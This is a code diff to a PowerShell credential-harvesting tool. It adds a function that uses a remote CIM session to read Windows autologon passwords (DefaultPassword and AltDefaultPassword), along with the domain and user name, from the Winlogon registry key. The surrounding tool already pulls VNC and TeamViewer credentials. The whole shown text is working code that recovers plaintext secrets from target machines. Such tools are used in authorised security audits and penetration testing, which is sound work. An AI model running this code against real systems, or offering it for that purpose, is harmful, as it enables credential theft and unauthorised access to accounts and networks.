@@ -95,6 +95,7 @@ Function Get-CredentialRegistry {
 
         # Common credential registry keys
 
+        Get-WinlogonCredentialRegistry -CimSession $cimSession
         Get-VncCredentialRegistry -CimSession $cimSession
         Get-TeamViewerCredentialRegistry -CimSession $cimSession
 
@@ -111,6 +112,51 @@ Function Get-CredentialRegistry {
 
     END {
         Remove-CimSession -CimSession $cimSession
+    }
+}
+
+Function Local:Get-WinlogonCredentialRegistry {
+    Param (
+        [Parameter(Mandatory = $True)]
+        [CimSession]
+        $CimSession
+    )
+
+    [uint32]$HKLM = 2147483650
+    $location = "SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+    if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultPassword'} -CimSession $cimSession -Verbose:$false).sValue) {
+        $creds = New-Object -TypeName psobject
+        if ($domain = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultDomainName'} -CimSession $cimSession -Verbose:$false).sValue) {
+            $creds | Add-Member -MemberType NoteProperty -Name 'Domain' -Value $domain
+        }
+        if ($username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultUserName'} -CimSession $cimSession -Verbose:$false).sValue) {
+            $creds | Add-Member -MemberType NoteProperty -Name 'Username' -Value $username
+        }
+        $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value $password
+        $obj = New-Object -TypeName psobject
+        $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+        $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
+        $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
+        $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
+        Write-Output $obj
+    }
+
+    if ($password = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='AltDefaultPassword'} -CimSession $cimSession -Verbose:$false).sValue) {
+        $creds = New-Object -TypeName psobject
+        if ($domain = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultDomainName'} -CimSession $cimSession -Verbose:$false).sValue) {
+            $creds | Add-Member -MemberType NoteProperty -Name 'Domain' -Value $domain
+        }
+        if ($username = (Invoke-CimMethod -Class 'StdRegProv' -Name 'GetStringValue' -Arguments @{hDefKey=$HKLM; sSubKeyName=$location; sValueName='DefaultUserName'} -CimSession $cimSession -Verbose:$false).sValue) {
+            $creds | Add-Member -MemberType NoteProperty -Name 'Username' -Value $username
+        }
+        $creds | Add-Member -MemberType NoteProperty -Name 'Password' -Value $password
+        $obj = New-Object -TypeName psobject
+        $obj | Add-Member -MemberType NoteProperty -Name 'ComputerName' -Value $ComputerName
+        $obj | Add-Member -MemberType NoteProperty -Name 'Type' -Value 'WinLogon'
+        $obj | Add-Member -MemberType NoteProperty -Name 'Location' -Value $location
+        $obj | Add-Member -MemberType NoteProperty -Name 'Credential' -Value $creds
+        Write-Output $obj
     }
 }
 
